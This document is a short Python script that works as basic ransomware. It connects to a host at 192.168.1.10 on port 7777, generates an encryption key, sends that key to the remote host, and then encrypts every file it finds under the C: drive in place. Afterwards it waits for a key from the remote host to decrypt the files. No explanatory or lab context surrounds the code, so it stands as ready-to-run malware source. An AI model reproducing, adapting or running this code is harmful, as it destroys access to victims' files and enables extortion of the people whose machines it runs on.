from cryptography.fernet import Fernet
import socket
import os

ip="192.168.1.10"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,7777))
print('connected')

def encrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
       file_data = file.read()
    
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except:
        print('invalid key')
        return
    with open(filename, "wb") as file:
        file.write(decrypted_data)

path = r'C:'

key = Fernet.generate_key()
s.send(str(key,'utf-8').encode())
for subdir, dirs, files in os.walk(path):
    for filename in files:
        filepath = subdir + os.sep + filename
        print('encrypting: '+filepath)
        encrypt(filepath,key)


key = s.recv(1024).decode()
for subdir, dirs, files in os.walk(path):
    for filename in files:
        filepath = subdir + os.sep + filename
        print('decrypting: '+filepath)
        decrypt(filepath,key)